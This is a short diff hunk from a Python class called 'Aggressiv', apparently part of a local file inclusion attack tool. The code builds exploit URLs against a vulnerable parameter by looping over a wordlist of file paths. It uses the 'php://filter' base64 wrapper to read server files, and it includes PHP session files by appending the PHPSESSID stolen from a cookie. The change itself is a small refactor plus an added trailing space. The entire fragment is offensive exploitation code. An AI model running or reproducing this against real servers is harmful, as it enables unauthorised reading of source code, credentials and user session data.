@@ -133,14 +133,14 @@ class Aggressiv :
                 for LINE in command_dir :
                     LINE.replace('\n','')
                     self.LFi = ''
+                    phpfillter = 'php://filter/read=convert.base64-encode/resource='
                     if self.args.base64:
                         if 'sess_' not in LINE :
-                            phpfillter = 'php://filter/read=convert.base64-encode/resource='
                             URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                         else:
-                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))
+                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))+" "
                     elif "sess_" in LINE: 
-                        URL = self.args.Vulnurl+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie))) 
+                        URL = self.args.Vulnurl+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))+" " 
                     else:
                          URL = self.args.Vulnurl+LINE
                                                                                       
